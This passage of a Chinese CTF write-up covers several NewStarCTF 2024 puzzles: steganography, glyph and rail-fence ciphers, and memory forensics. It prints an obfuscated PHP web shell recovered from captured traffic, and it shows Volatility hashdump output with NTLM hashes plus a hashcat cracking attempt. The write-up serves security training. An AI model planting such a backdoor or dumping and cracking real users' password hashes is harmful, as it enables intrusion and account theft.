<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Wireshark_dqjbTx4kGz.png"></p>
<p>打开010Editor，把PNG图片头（<code>%PNG</code>）前面的HTTP标头删掉，保存</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/010Editor_c1w8O5vZmQ.png"></p>
<p>打开后就可以看到flag了，为<code>flag&#123;you_are_gooddddd&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/dllhost_CzhNyCyPgh.png"></p>
<div class="note info flat"><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/QQ_mS6997VV1T.png"></p>
</div>

<h3 id="字里行间的秘密"><a href="#字里行间的秘密" class="headerlink" title="字里行间的秘密"></a>字里行间的秘密</h3><blockquote>
<p>我横竖睡不着，仔细看了半夜，才从字缝里看出字来</p>
<p>【难度：中等】</p>
</blockquote>
<p>压缩包里有一个docx和一个txt，TXT打开内容如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/notepad_oiMKmA07jw.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‌‌‌‌‍‬‬‍这里好像有什么东西‌‌‌‌‍﻿‍‌‌‌‌‌‍‍﻿﻿‌‌‌‌‍‬‬‍‌‌‌‌‍﻿‌﻿‌‌‌‌‍‍﻿﻿‌‌‌‌‍‬‬﻿，‌‌‌‌‌﻿‌﻿‌‌‌‌‍﻿‬‍你看见了嘛，是我看错了嘛</span><br></pre></td></tr></table></figure>

<p>（注：在txt文档里里面零宽字符看不到，在Markdown里面能看到替代符）</p>
<p>所以很明显是零宽字符隐写，直接上工具，得到密码<code>it_is_k3y</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_On0u7a5gDM.png"></p>
<p>打开word文档后，发现就一行字，首先按下<kbd>Ctrl</kbd>+<kbd>A</kbd>看看有没有白色字符，发现有，设置成黑色就出来了，flag为<code>flag&#123;you_h4ve_4nyth1n9&#125;</code></p>
<h3 id="Herta’s-Study"><a href="#Herta’s-Study" class="headerlink" title="Herta’s Study"></a>Herta’s Study</h3><blockquote>
<p>黑塔女士在进行一项新的研究，她截获了银狼作为新手黑客时的渗透流量，不过这小家伙喜欢整点新花样。“在战场上，如果我牺牲了，我不希望我的代码被敌人轻易使用”</p>
<p>【难度：中等】</p>
</blockquote>
<p>经过wireshark分析可以得到后门代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>];</span><br><span class="line"><span class="variable">$payload</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">create_function</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;J&#x27;</span>.<span class="title function_ invoke__">str_rot13</span>(<span class="string">&#x27;T&#x27;</span>).<span class="string">&#x27;5z&#x27;</span>), <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;JG5zPWJhc2U2NF9lbmNvZGUoJG5zKTsNCmZvcigkaT0wOyRpPHN0cmxlbigkbnMpOyRpKz0xKXsNCiAgICBpZigkaSUy&#x27;</span>.<span class="title function_ invoke__">str_rot13</span>(<span class="string">&#x27;CG0kXKfAPvNtVPNtVPNtWT5mJlEcKG1m&#x27;</span>).<span class="string">&#x27;dHJfcm90MTMoJG5zWyRpXSk7DQogICAgfQ0KfQ0KcmV0dXJuICRuczs==&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$bbb</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到中间有一段str_rot13，是进行了ROT13计算，我们给它反回来就变成了<code>PT0xKXsNCiAgICAgICAgJG5zWyRpXT1z</code></p>
<p>所以进行b64解码的字符串为<code>JG5zPWJhc2U2NF9lbmNvZGUoJG5zKTsNCmZvcigkaT0wOyRpPHN0cmxlbigkbnMpOyRpKz0xKXsNCiAgICBpZigkaSUyPT0xKXsNCiAgICAgICAgJG5zWyRpXT1zdHJfcm90MTMoJG5zWyRpXSk7DQogICAgfQ0KfQ0KcmV0dXJuICRuczs==</code>，得到<code>$bbb</code>的实际代码为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ns</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$ns</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$ns</span>);<span class="variable">$i</span>+=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span>%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$ns</span>[<span class="variable">$i</span>]=<span class="title function_ invoke__">str_rot13</span>(<span class="variable">$ns</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ns</span>;</span><br></pre></td></tr></table></figure>

<p>也就是每个偶数位的字母（因为第一个是0，第二个是1）进行了ROT13计算，所以我们写个脚本把它反回来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_rot13</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> codecs.encode(text, <span class="string">&#x27;rot_13&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    string = <span class="built_in">input</span>(<span class="string">&quot;请输入需要解码的字符：&quot;</span>)</span><br><span class="line">    decrypted = <span class="string">&quot;&quot;</span></span><br><span class="line">    reversed_base = <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 进行ROT13逆运算</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string)):</span><br><span class="line">        <span class="keyword">if</span> string[i] == <span class="string">&quot;=&quot;</span>:</span><br><span class="line">            reversed_base += <span class="string">&quot;=&quot;</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            reversed_base += reverse_rot13(string[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            reversed_base += string[i]</span><br><span class="line"></span><br><span class="line">    decrypted = base64.b64decode(reversed_base).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;经过ROT13逆运算的编码字符串为:&quot;</span>, reversed_base)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;明文结果为:&quot;</span>, decrypted)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后就可以把所有的输出放进去看看内容了，得到flag为<code>flag&#123;sH3_i4_S0_6eAut1fuL.&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/2rdVxzPIJS.png"></p>
<h3 id="你也玩原神吗（未做出）"><a href="#你也玩原神吗（未做出）" class="headerlink" title="你也玩原神吗（未做出）"></a>你也玩原神吗（未做出）</h3><blockquote>
<p>如果你玩原神,那么你看得懂这些提瓦特文字吗?请把得到的内容用flag{}包裹</p>
<p>【难度：简单】</p>
</blockquote>
<p>打开来附件是个压缩包，里面有张gif，通过ps分层可以得到全是提瓦特文字的图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Photoshop_8V2FSnW1RP.png"></p>
<p>根据玩家社区的文档，我们可以得知这些文字是蒙德文</p>
<blockquote>
<p><a href="https://github.com/SpeedyOrc-C/HoYo-Glyphs">SpeedyOrc-C&#x2F;HoYo-Glyphs: Constructed scripts by HoYoverse 米哈游的架空文字 (github.com)</a></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_SfvxZw4F5G.png"></p>
<p>开始比对，中间的一大段话，打了最开始的是个字母就发现应该是经典占位符文本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</span><br></pre></td></tr></table></figure>

<p>所以这一段没用，看看角落，翻译出来如图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Photoshop_EORgMzSUVZ.png"></p>
<p>最让我在意的是左上角<code>FLAGISASSENTENCE</code>即<code>FLAG IS A SENTENCE</code>，flag是个句子，所以我一开始认为flag就是中间文段的内容，所以就有了flag为<code>flag&#123;LOREM_IPSUM_DOLOR_SIT_AMET_CONSECTETUR_ADIPISCING_ELIT_SED_DO_EIUSMOD_TEMPOR_INCIDIDUNT_UT_LABORE_ET_DOLORE_MAGNA_ALIQUA_QUIS&#125;</code>，但是不对</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Photoshop_udn9BjnCHW.png"></p>
<p>然后我发现左下角搞错了，做下角正确翻译是<code>DOYOUKNOWFENCE</code>即提示我们栅栏密码</p>
<p>尝试使用栅栏密码穷举，密文是右上角+右下角的内容，结果如下</p>
<table>
<thead>
<tr>
<th>2</th>
<th>IAIAABAGENLHGNTSSGFOKGFMAYMEEISATDOE</th>
</tr>
</thead>
<tbody><tr>
<td>3</td>
<td>IFOKIFGAAMMEASYTEOEALAIBGGANTHDNSSEG</td>
</tr>
<tr>
<td>4</td>
<td>IGAYATISBEGFAKNIHFAANASMEEGDOSLTGEMO</td>
</tr>
<tr>
<td>5</td>
<td>ILEHINSGITTSAGOSAFAODGAKAFBMEYGAEMNE</td>
</tr>
<tr>
<td>6</td>
<td>IEFASIGAALIGMBOAGGETASSNMDYHTFAKONEE</td>
</tr>
<tr>
<td>7</td>
<td>IAFSGOAGNTKEILFOHMDYNAAGATMASEEIGBES</td>
</tr>
<tr>
<td>8</td>
<td>IASMAHGAMNAEFEILKSBSYDEGGTFGATAONOIE</td>
</tr>
<tr>
<td>9</td>
<td>IASMANGYDEOHAEFEILKSBNGIEAMSGTFGATAO</td>
</tr>
<tr>
<td>10</td>
<td>IAGKEANGYDEOHASFTAIESATBNGIEAMSGOMFL</td>
</tr>
<tr>
<td>11</td>
<td>IALSFEANGYDEOHASAFGAIETKMTBNGIEAMSGO</td>
</tr>
<tr>
<td>12</td>
<td>IALSFEOBHGYDEONGASAFGAIETKMTANSGIEAM</td>
</tr>
<tr>
<td>13</td>
<td>IALSFEOBHGMIEAYONGASAFGAIETKMTANSGED</td>
</tr>
<tr>
<td>14</td>
<td>IALSFEOBHGMEAEDIYONGASAFGAIETKMTANSG</td>
</tr>
<tr>
<td>15</td>
<td>IALSFEOBHSOMEAEDIYGGNGASAFGAIETKMTAN</td>
</tr>
<tr>
<td>16</td>
<td>IALSFEOAGHSOMEAEDIYGGNNBASAFGAIETKMT</td>
</tr>
<tr>
<td>17</td>
<td>IALSFMSOAGHSOMEAEDIYGGNNBATEAFGAIETK</td>
</tr>
<tr>
<td>18</td>
<td>IALTFFMSOAGHSOMEAEDIYGGNNBATEAKSGAIE</td>
</tr>
<tr>
<td>19</td>
<td>IIALTFFMSOAGHSOMEAEDIYGGNNBATEAKSGEA</td>
</tr>
<tr>
<td>20</td>
<td>IIAALTFFMSOAGHSOMEAEDIYGGNNBATEAKSGE</td>
</tr>
<tr>
<td>21</td>
<td>IIAAELTFFMSOAGHSOMEAEDIYGGNNBATEAKSG</td>
</tr>
<tr>
<td>22</td>
<td>IIAAELGTFFMSOAGHSOMEAEDIYGGNNBATEAKS</td>
</tr>
<tr>
<td>23</td>
<td>IIAAELGTSFFMSOAGHSOMEAEDIYGGNNBATEAK</td>
</tr>
<tr>
<td>24</td>
<td>IIAAELGTSFKFMSOAGHSOMEAEDIYGGNNBATEA</td>
</tr>
<tr>
<td>25</td>
<td>IIAAELGTSFKFAMSOAGHSOMEAEDIYGGNNBATE</td>
</tr>
<tr>
<td>26</td>
<td>IIAAELGTSFKFAMESOAGHSOMEAEDIYGGNNBAT</td>
</tr>
<tr>
<td>27</td>
<td>IIAAELGTSFKFAMESTOAGHSOMEAEDIYGGNNBA</td>
</tr>
<tr>
<td>28</td>
<td>IIAAELGTSFKFAMESTOAAGHSOMEAEDIYGGNNB</td>
</tr>
<tr>
<td>29</td>
<td>IIAAELGTSFKFAMESTOAABGHSOMEAEDIYGGNN</td>
</tr>
<tr>
<td>30</td>
<td>IIAAELGTSFKFAMESTOAABGNHSOMEAEDIYGGN</td>
</tr>
<tr>
<td>31</td>
<td>IIAAELGTSFKFAMESTOAABGNHNSOMEAEDIYGG</td>
</tr>
<tr>
<td>32</td>
<td>IIAAELGTSFKFAMESTOAABGNHNSGOMEAEDIYG</td>
</tr>
<tr>
<td>33</td>
<td>IIAAELGTSFKFAMESTOAABGNHNSGOGMEAEDIY</td>
</tr>
<tr>
<td>34</td>
<td>IIAAELGTSFKFAMESTOAABGNHNSGOGMYEAEDI</td>
</tr>
<tr>
<td>35</td>
<td>IIAAELGTSFKFAMESTOAABGNHNSGOGMYEIAED</td>
</tr>
<tr>
<td>36</td>
<td>IIAAELGTSFKFAMESTOAABGNHNSGOGMYEIADE</td>
</tr>
</tbody></table>
<p>没有什么有意义的结果，他说是个句子，所以说明不对，但是没抓手了，跑路！</p>
<h3 id="热心助人的小明同学"><a href="#热心助人的小明同学" class="headerlink" title="热心助人的小明同学"></a>热心助人的小明同学</h3><blockquote>
<p>小明的邻居小红忘记了电脑的登录密码，好像设置的还挺复杂的，现在小红手里只有一个内存镜像（为什么她会有这个？），小明为了帮助邻居就找到了精通电脑的你……</p>
<p>【难度：简单】</p>
</blockquote>
<details class="toggle" ><summary class="toggle-button" style="">试错部分</summary><div class="toggle-content"><p>这是一题内存取证题目，通过vol2（或者vol3）可以得到这是一个Windows7系列的内存镜像</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/BdeDBHPbpZ.png"></p>
<p>然后尝试提取出密码，使用<code>vol.exe -f image.raw --profile=Win7SP1x86_23418 hashdump</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;vol.exe -f image.raw --profile=Win7SP1x86_23418 hashdump</span><br><span class="line"></span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:10eca58175d4228ece151e287086e824:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:bd4667328af8beb097a299187278c48f:::</span><br><span class="line">Xiaohong:1003:aad3b435b51404eeaad3b435b51404ee:3fa7d7d3c37b8e9baaf6ed13d70ed858:::</span><br></pre></td></tr></table></figure>

<p>得到Xiaohong的密码经过LM哈希和NTLM哈希分别为<code>aad3b435b51404eeaad3b435b51404ee</code>、<code>3fa7d7d3c37b8e9baaf6ed13d70ed858</code></p>
<p>尝试hashcat爆破，使用的字典是<a href="https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz">rockyou.txt</a>，但是爆破不出来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_pFfVyR9MXh.png"></p>
<p>尝试寻找提示，使用<code>vol.exe -f image.raw --profile=Win7SP1x86_23418 cmdline</code>查看终端命令运行情况，看到有个<code>C:\Users\Xiaohong\Desktop\Diary.txt</code>，估计是提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">&gt;vol.exe -f image.raw --profile=Win7SP1x86_23418 cmdline</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">************************************************************************</span><br><span class="line">System pid:      4</span><br><span class="line">************************************************************************</span><br><span class="line">smss.exe pid:    612</span><br><span class="line">Command line : \SystemRoot\System32\smss.exe</span><br><span class="line">************************************************************************</span><br><span class="line">csrss.exe pid:    708</span><br><span class="line">Command line : %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16</span><br><span class="line">************************************************************************</span><br><span class="line">wininit.exe pid:    740</span><br><span class="line">Command line : wininit.exe</span><br><span class="line">************************************************************************</span><br><span class="line">csrss.exe pid:    748</span><br><span class="line">Command line : %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16</span><br><span class="line">************************************************************************</span><br><span class="line">services.exe pid:    788</span><br><span class="line">Command line : C:\Windows\system32\services.exe</span><br><span class="line">************************************************************************</span><br><span class="line">lsass.exe pid:    804</span><br><span class="line">Command line : C:\Windows\system32\lsass.exe</span><br><span class="line">************************************************************************</span><br><span class="line">lsm.exe pid:    812</span><br><span class="line">Command line : C:\Windows\system32\lsm.exe</span><br><span class="line">************************************************************************</span><br><span class="line">winlogon.exe pid:    844</span><br><span class="line">Command line : winlogon.exe</span><br><span class="line">************************************************************************</span><br><span class="line">svchost.exe pid:    960</span><br><span class="line">Command line : C:\Windows\system32\svchost.exe -k DcomLaunch</span><br><span class="line">************************************************************************</span><br><span class="line">svchost.exe pid:   1036</span><br><span class="line">Command line : C:\Windows\system32\svchost.exe -k RPCSS</span><br><span class="line">************************************************************************</span><br><span class="line">svchost.exe pid:   1116</span><br><span class="line">Command line : C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted</span><br><span class="line">************************************************************************</span><br><span class="line">svchost.exe pid:   1160</span><br><span class="line">Command line : C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted</span><br><span class="line">************************************************************************</span><br><span class="line">svchost.exe pid:   1208</span><br><span class="line">Command line : C:\Windows\system32\svchost.exe -k LocalService</span><br><span class="line">************************************************************************</span><br><span class="line">svchost.exe pid:   1244</span><br><span class="line">Command line : C:\Windows\system32\svchost.exe -k netsvcs</span><br><span class="line">************************************************************************</span><br><span class="line">TrustedInstall pid:   1320</span><br><span class="line">Command line : C:\Windows\servicing\TrustedInstaller.exe</span><br><span class="line">************************************************************************</span><br><span class="line">svchost.exe pid:   1480</span><br><span class="line">Command line : C:\Windows\system32\svchost.exe -k NetworkService</span><br><span class="line">************************************************************************</span><br><span class="line">spoolsv.exe pid:   1596</span><br><span class="line">Command line : C:\Windows\System32\spoolsv.exe</span><br><span class="line">************************************************************************</span><br><span class="line">svchost.exe pid:   1624</span><br><span class="line">Command line : C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork</span><br><span class="line">************************************************************************</span><br><span class="line">svchost.exe pid:   1720</span><br><span class="line">Command line : C:\Windows\System32\svchost.exe -k ICService</span><br><span class="line">************************************************************************</span><br><span class="line">svchost.exe pid:   1844</span><br><span class="line">Command line : C:\Windows\System32\svchost.exe -k utcsvc</span><br><span class="line">************************************************************************</span><br><span class="line">svchost.exe pid:   1884</span><br><span class="line">Command line : C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation</span><br><span class="line">************************************************************************</span><br><span class="line">VSSVC.exe pid:   2196</span><br><span class="line">Command line : C:\Windows\system32\vssvc.exe</span><br><span class="line">************************************************************************</span><br><span class="line">sppsvc.exe pid:   2408</span><br><span class="line">Command line : C:\Windows\system32\sppsvc.exe</span><br><span class="line">************************************************************************</span><br><span class="line">taskhost.exe pid:   2596</span><br><span class="line">Command line : &quot;taskhost.exe&quot;</span><br><span class="line">************************************************************************</span><br><span class="line">dwm.exe pid:   2732</span><br><span class="line">Command line : &quot;C:\Windows\system32\Dwm.exe&quot;</span><br><span class="line">************************************************************************</span><br><span class="line">explorer.exe pid:   2812</span><br><span class="line">Command line : C:\Windows\Explorer.EXE</span><br><span class="line">************************************************************************</span><br><span class="line">SearchIndexer. pid:   3164</span><br><span class="line">Command line : C:\Windows\system32\SearchIndexer.exe /Embedding</span><br><span class="line">************************************************************************</span><br><span class="line">SearchProtocol pid:   3232</span><br><span class="line">Command line : &quot;C:\Windows\system32\SearchProtocolHost.exe&quot; Global\UsGthrFltPipeMssGthrPipe1_ Global\UsGthrCtrlFltPipeMssGthrPipe1 1 -2147483646 &quot;Software\Microsoft\Windows Search&quot; &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)&quot; &quot;C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc&quot; &quot;DownLevelDaemon&quot;</span><br><span class="line">************************************************************************</span><br><span class="line">SearchFilterHo pid:   3252</span><br><span class="line">Command line : &quot;C:\Windows\system32\SearchFilterHost.exe&quot; 0 568 572 580 65536 576</span><br><span class="line">************************************************************************</span><br><span class="line">wmpnetwk.exe pid:   3336</span><br><span class="line">Command line : &quot;C:\Program Files\Windows Media Player\wmpnetwk.exe&quot;</span><br><span class="line">************************************************************************</span><br><span class="line">WmiPrvSE.exe pid:   3568</span><br><span class="line">Command line : C:\Windows\system32\wbem\wmiprvse.exe</span><br><span class="line">************************************************************************</span><br><span class="line">svchost.exe pid:   3688</span><br><span class="line">Command line : C:\Windows\System32\svchost.exe -k LocalServicePeerNet</span><br><span class="line">************************************************************************</span><br><span class="line">notepad.exe pid:   3924</span><br><span class="line">Command line : &quot;C:\Windows\system32\NOTEPAD.EXE&quot; C:\Users\Xiaohong\Desktop\Diary.txt</span><br><span class="line">************************************************************************</span><br><span class="line">MagnetRAMCaptu pid:   2980</span><br><span class="line">Command line : &quot;C:\Users\Xiaohong\Desktop\MagnetRAMCapture.exe&quot;</span><br><span class="line">************************************************************************</span><br><span class="line">mscorsvw.exe pid:   1768</span><br><span class="line">Command line : C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe</span><br><span class="line">************************************************************************</span><br><span class="line">svchost.exe pid:   2372</span><br><span class="line">Command line : C:\Windows\System32\svchost.exe -k secsvcs</span><br></pre></td></tr></table></figure>

<p>接着尝试把这个文件提取出来，使用<code>vol.exe -f image.raw --profile=Win7SP1x86_23418 filescan | findstr txt</code>尝试寻找文件所在的内存地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;vol.exe -f image.raw --profile=Win7SP1x86_23418 filescan | findstr txt</span><br><span class="line"></span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">0x00000000f554bf80      8      0 RW-r-- \Device\HarddiskVolume2\Users\Xiaohong\Desktop\Diary.txt</span><br><span class="line">0x00000000f55ccb30      1      1 -W-rw- \Device\HarddiskVolume2\Users\Xiaohong\AppData\Local\Temp\FXSAPIDebugLogFile.txt</span><br></pre></td></tr></table></figure>

<p>看到文件所在内存地址为<code>0xf554bf80</code>，尝试提取出来，使用<code>vol.exe -f image.raw --profile=Win7SP1x86_23418 dumpfiles -Q 0x00000000f554bf80 -D ./</code>将文件提取到当前目录</p>
